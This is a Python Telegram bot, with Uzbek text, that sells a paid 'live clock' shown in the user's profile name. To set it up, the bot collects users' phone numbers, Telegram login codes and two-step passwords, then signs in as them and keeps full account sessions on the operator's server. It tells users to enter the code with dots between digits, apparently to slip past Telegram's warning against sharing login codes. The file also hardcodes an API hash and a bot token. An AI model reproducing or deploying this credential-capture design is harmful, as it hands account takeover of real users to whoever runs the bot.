import os
from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot ishlayapti!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_web, daemon=True).start()


# 👇 Pydroid'dagi kodingni shu yerdan boshlab qo'yasan

import asyncio
import pytz
from datetime import datetime, timedelta
from pyrogram import Client, filters, idle
from pyrogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, 
    InlineKeyboardMarkup, InlineKeyboardButton, 
    ReplyKeyboardRemove, CallbackQuery
)
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid

# ================= SOZLAMALAR =================
API_ID = 25602001  # my.telegram.org'dan olingan API_ID
API_HASH = "381328485b0d7e201b86687e6161626d"
BOT_TOKEN = "8834695846:AAGb-ZH41lz_Deq47layHa93mT2i0Q6uuU0"
ADMIN_ID = 6200478850  # Adminning Telegram ID raqami

bot = Client("pro_clock_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Vaqtinchalik "Baza" (Dastur to'xtasa o'chib ketadi, keyinroq DB qo'shamiz)
users_db = {}
user_states = {}

# Narxlar (kun: so'm)
PRICES = {
    1: 1000,
    7: 5000,
    30: 15000
}

# ================= YORDAMCHI FUNKSIYALAR =================

def get_user(user_id):
    if user_id not in users_db:
        users_db[user_id] = {
            "balance": 0,
            "sub_end": None, # datetime obyekti
            "phone": None,
            "phone_code_hash": None,
            "app": None,
            "is_active": False
        }
    return users_db[user_id]

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👤 Profil", callback_data="menu_profile")],
        [InlineKeyboardButton("🛒 Xarid qilish", callback_data="menu_buy")],
        [InlineKeyboardButton("💳 Hisobni to'ldirish", callback_data="menu_topup")]
    ])

# ================= ASOSIY BOT QISMI =================

@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(client, message):
    get_user(message.from_user.id)
    user_states[message.from_user.id] = None
    await message.reply_text(
        "👋 Salom! Premium soat botiga xush kelibsiz.\n"
        "Quyidagi menyu orqali botni boshqarishingiz mumkin:",
        reply_markup=main_menu_keyboard()
    )

@bot.on_callback_query(filters.regex(r"^menu_"))
async def process_menu(client, callback_query: CallbackQuery):
    action = callback_query.data.split("_")[1]
    user_id = callback_query.from_user.id
    user = get_user(user_id)
    
    if action == "profile":
        status = "Faol emas 🔴"
        time_left = "0 kun, 0 soat"
        
        if user["is_active"] and user["sub_end"]:
            now = datetime.now(pytz.timezone('Asia/Tashkent'))
            if user["sub_end"] > now:
                status = "Faol 🟢"
                diff = user["sub_end"] - now
                time_left = f"{diff.days} kun, {diff.seconds // 3600} soat"
            else:
                user["is_active"] = False

        text = (
            f"👤 **Sizning profilingiz:**\n\n"
            f"💰 **Balans:** {user['balance']} so'm\n"
            f"📊 **Holati:** {status}\n"
            f"⏳ **Qolgan vaqt:** {time_left}\n"
        )
        await callback_query.message.edit_text(text, reply_markup=main_menu_keyboard())
        
    elif action == "topup":
        await callback_query.message.delete()
        await bot.send_message(
            user_id, 
            "💳 Hisobingizni to'ldirish uchun summani raqamlarda kiriting (Masalan: 5000):"
        )
        user_states[user_id] = "waiting_topup_amount"
        
    elif action == "buy":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"{days} Kun - {price} so'm", callback_data=f"buy_{days}")] 
            for days, price in PRICES.items()
        ] + [[InlineKeyboardButton("🔙 Orqaga", callback_data="menu_profile")]])
        
        await callback_query.message.edit_text(
            "🛒 **Ta'rifni tanlang:**\nTarif tugaganda soat o'zgarishi avtomatik to'xtaydi.",
            reply_markup=keyboard
        )

# --- HISOBNI TO'LDIRISH TIZIMI ---

@bot.on_message(filters.text & filters.private & ~filters.command("start"))
async def process_text_inputs(client, message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    user = get_user(user_id)
    
    # 1. Pul kiritish
    if state == "waiting_topup_amount":
        if not message.text.isdigit():
            await message.reply_text("❌ Iltimos, faqat raqam kiriting:")
            return
            
        amount = int(message.text)
        
        # Adminga yuboriladigan tasdiq tugmalari
        admin_kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ Qabul qilish", callback_data=f"admin_accept_{user_id}_{amount}"),
                InlineKeyboardButton("❌ Rad etish", callback_data=f"admin_reject_{user_id}_{amount}")
            ]
        ])
        
        # Adminga xabar yuborish
        await bot.send_message(
            ADMIN_ID,
            f"🔔 **Yangi to'lov so'rovi!**\n\n"
            f"👤 Foydalanuvchi: {message.from_user.mention}\n"
            f"🆔 ID: `{user_id}`\n"
            f"💰 Summa: **{amount} so'm**",
            reply_markup=admin_kb
        )
        
        await message.reply_text(
            "✅ So'rov adminga yuborildi!\n"
            "Mablag' tushishi uchun adminga murojaat qiling va to'lov chekini taqdim eting.\n\n"
            "👨‍💻 **Admin:** @SizningAdminUsernami", 
            reply_markup=main_menu_keyboard()
        )
        user_states[user_id] = None

    # 2. Kodni qabul qilish qadami (1.2.3.4.5)
    elif state == "waiting_for_code":
        clean_code = message.text.replace(".", "").replace(" ", "")
        if not clean_code.isdigit():
            await message.reply_text("Iltimos, kodni nuqtalar bilan yuboring (Misol: 1.2.3.4.5):")
            return
            
        user_app = user.get("app")
        
        try:
            await user_app.sign_in(user["phone"], user["phone_code_hash"], clean_code)
            user["is_active"] = True
            await message.reply_text("✅ Akkauntga ulandi! Jonli soat ishga tushdi.", reply_markup=main_menu_keyboard())
            user_states[user_id] = None
            
        except SessionPasswordNeeded:
            await message.reply_text("🔐 Akkauntingizda 2 bosqichli parol bor ekan. Parolni yuboring:")
            user_states[user_id] = "waiting_for_password"
            
        except PhoneCodeInvalid:
            await message.reply_text("❌ Kod xato! Qaytadan nuqtalar bilan yuboring (Misol: 1.2.3.4.5):")
            
        except Exception as e:
            await message.reply_text(f"❌ Xatolik: {e}")

    # 3. Parolni qabul qilish (2FA)
    elif state == "waiting_for_password":
        try:
            await user["app"].check_password(message.text)
            user["is_active"] = True
            await message.reply_text("✅ Akkauntga ulandi! Jonli soat ishga tushdi.", reply_markup=main_menu_keyboard())
            user_states[user_id] = None
        except Exception as e:
            await message.reply_text("❌ Parol xato. Qaytadan urinib ko'ring:")


# --- ADMIN TASDIG'I ---

@bot.on_callback_query(filters.regex(r"^admin_"))
async def admin_decision(client, callback_query: CallbackQuery):
    # Faqat admin bosa olishiga ishonch hosil qilamiz
    if callback_query.from_user.id != ADMIN_ID:
        return
        
    data = callback_query.data.split("_")
    action = data[1]
    target_user = int(data[2])
    amount = int(data[3])
    
    if action == "accept":
        user = get_user(target_user)
        user["balance"] += amount
        
        await callback_query.message.edit_text(
            f"✅ {target_user} hisobiga {amount} so'm qabul qilindi!"
        )
        # Foydalanuvchiga xabar beramiz
        await bot.send_message(
            target_user, 
            f"🎉 **Hisobingiz to'ldirildi!**\nBalansingizga {amount} so'm qo'shildi.",
            reply_markup=main_menu_keyboard()
        )
        
    elif action == "reject":
        await callback_query.message.edit_text(f"❌ {target_user} ning {amount} so'mlik so'rovi rad etildi.")
        await bot.send_message(target_user, "❌ Hisobni to'ldirish so'rovi admin tomonidan rad etildi.")


# --- XARID QILISH TIZIMI ---

@bot.on_callback_query(filters.regex(r"^buy_"))
async def process_buy(client, callback_query: CallbackQuery):
    days = int(callback_query.data.split("_")[1])
    price = PRICES[days]
    user_id = callback_query.from_user.id
    user = get_user(user_id)
    
    if user["balance"] < price:
        await callback_query.answer("❌ Hisobingizda yetarli mablag' yo'q!", show_alert=True)
        return
        
    # Balansdan yechish va vaqt qo'shish
    user["balance"] -= price
    now = datetime.now(pytz.timezone('Asia/Tashkent'))
    
    if user["sub_end"] and user["sub_end"] > now:
        user["sub_end"] += timedelta(days=days)
    else:
        user["sub_end"] = now + timedelta(days=days)
        
    await callback_query.message.delete()
    
    # Agar ilova hali ulanmagan bo'lsa, kontakt so'raymiz
    if not user["is_active"] or not user["app"]:
        keyboard = ReplyKeyboardMarkup(
            [[KeyboardButton("📱 Kontaktni yuborish", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await bot.send_message(
            user_id,
            f"✅ To'lov muvaffaqiyatli! Obuna {days} kunga uzaytirildi.\n\n"
            "Soatni o'rnatish uchun pastdagi tugma orqali kontaktingizni yuboring:",
            reply_markup=keyboard
        )
        user_states[user_id] = "waiting_for_contact"
    else:
        await bot.send_message(
            user_id, 
            f"✅ To'lov qabul qilindi! Obunangiz yana {days} kunga uzaytirildi va soat ishlashda davom etmoqda.",
            reply_markup=main_menu_keyboard()
        )

# --- KONTAKT VA AVTORIZATSIYA ---

@bot.on_message(filters.contact)
async def get_contact(client, message):
    user_id = message.from_user.id
    if user_states.get(user_id) == "waiting_for_contact":
        phone = message.contact.phone_number
        user = get_user(user_id)
        user["phone"] = phone
        
        await message.reply_text("⏳ So'rov yuborilmoqda, kuting...", reply_markup=ReplyKeyboardRemove())
        
        user_app = Client(f"session_{user_id}", api_id=API_ID, api_hash=API_HASH)
        await user_app.connect()
        
        try:
            sent_code = await user_app.send_code(phone)
            user["phone_code_hash"] = sent_code.phone_code_hash
            user["app"] = user_app
            
            await message.reply_text(
                "📩 Kod yuborildi!\n\n"
                "Kodni raqamlar orasiga nuqta qo'yib yuboring (Misol: 1.2.3.4.5)."
            )
            user_states[user_id] = "waiting_for_code"
        except Exception as e:
            await message.reply_text(f"❌ Xatolik: {e}", reply_markup=main_menu_keyboard())
            user_states[user_id] = None


# ================= AVTOMATIK SOAT VA TEKSHIRUV =================

async def time_updater():
    """Vaqti tugaganlarni o'chiradi va faollarga soat qo'yadi"""
    tz = pytz.timezone('Asia/Tashkent')
    
    while True:
        now_time = datetime.now(tz)
        current_clock = now_time.strftime("%H:%M")
        
        for u_id, user_data in list(users_db.items()):
            # Obuna tugagan bo'lsa
            if user_data["is_active"] and user_data["sub_end"]:
                if now_time > user_data["sub_end"]:
                    user_data["is_active"] = False
                    
                    if user_data["app"] and user_data["app"].is_connected:
                        # Akkaunt ismidagi soatni tozalab qo'yamiz va uzamiz
                        try:
                            await user_data["app"].update_profile(last_name="")
                            await user_data["app"].disconnect()
                        except:
                            pass
                            
                    # Foydalanuvchini ogohlantirish
                    try:
                        await bot.send_message(u_id, "⚠️ **Diqqat!** Obunangiz vaqti tugadi va jonli soat to'xtatildi.", reply_markup=main_menu_keyboard())
                    except:
                        pass
                    continue
            
            # Agar obuna faol bo'lsa, ismni yangilash
            if user_data["is_active"] and user_data["app"]:
                try:
                    if user_data["app"].is_connected:
                        await user_data["app"].update_profile(last_name=f"| {current_clock}")
                except:
                    pass
                    
        await asyncio.sleep(60)


# ================= ASOSIY YURGIZUVCHI =================

async def main():
    print("Bot ishga tushmoqda...")
    await bot.start()
    
    asyncio.create_task(time_updater())
    
    print("Bot va Soat tizimi faol ishlamoqda!")
    await idle()
    
    for u_data in users_db.values():
        if u_data.get("app") and u_data["app"].is_connected:
            await u_data["app"].disconnect()
    await bot.stop()

if __name__ == "__main__":
    bot.run(main())
